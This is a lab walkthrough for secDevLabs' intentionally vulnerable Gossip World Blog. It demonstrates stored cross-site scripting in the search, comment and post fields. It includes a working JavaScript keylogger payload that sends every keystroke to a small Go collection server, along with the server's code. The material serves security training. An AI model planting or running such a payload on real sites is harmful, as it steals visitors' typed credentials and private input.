# Attack Narrative - Gossip World Blog (XSS)

The main goal of this documentation is to describe how a malicious user could exploit a Cross-Site Scripting vulnerability intentionally installed on Gossip World Blog from secDevLabs.

If you don't know [secDevLabs](https://github.com/globocom/secDevLabs) or this [intended vulnerable web application](https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a7/gossip-world) yet, you should check them before reading this narrative.

----

## Note: This attack narrative works best in Mozilla Firefox.

## 👀

After inspecting the application, it is possible to identify that some entries are not sanitized and can be  executed on web browser. It occurs on *search*, *comment* and *post* fields. The following images show this behavior when the following text  is used as an input on these fields:

```
<script>alert(1)</script>
```

Searching for a post:
   <img src="attack-1.png" align="center"/>
   <img src="attack-2.png" align="center"/>

Adding a new comment to a post:
   <img src="attack-3.png" align="center"/>
   <img src="attack-4.png" align="center"/>

Adding a new post:
   <img src="attack-5.png" align="center"/>
   <img src="attack-6.png" align="center"/>


The missing input validation allows a malicious user inserts some scripts that will persist in the server and be executed on victims browsers every time they access the routes that contain these scripts.

## 🔥

An attacker may abuse these flaws by generating malicious JS code and sending to other users. To demonstrate this, the following example will show how it is possibile to get all keyboard inputs from an user by persisting a malicious code in the server.

First, the following Golang API can be built (main.go) that logs all received requests:

```go
package main

import (
   "fmt"
   "github.com/labstack/echo"
)

func main() {
   e := echo.New()
   e.GET("/:k", handler)
   e.Logger.Fatal(e.Start(":1232"))
}

func handler(c echo.Context) error {
   fmt.Println(c.Request().RemoteAddr, c.Param("k"))
   return nil
}
```
   
To run this code simply type the following in your terminal (you should check this [guide](https://golang.org/doc/install) if you need any help with Golang): 

```sh
go run main.go
```

Then, the attacker can insert a new post through **/newgossip** route using the following code in text field:

```html
<script>
var k="";
document.onkeypress=function(e) {
   e = e || window.event;
   k+=e.key;
   var i=new Image;
   i.src="http://localhost:1232/"+k;
}
</script>
```

This code implements a keylogger by capturing all keyboard inputs from users and send them to the API created before.

   <img src="attack-7.png" align="center"/>

When a victim access the post, the browser will interpret the text between the script tag as a code and will execute it secretly. The following image shows the victim typing letters into the page that has been "infected" by the malicious JS:

<img src="attack-8.png" align="center"/>

The attacker now get all thee inputs on the server log, as show bellow: 

<img src="attack-9.png" align="center"/>
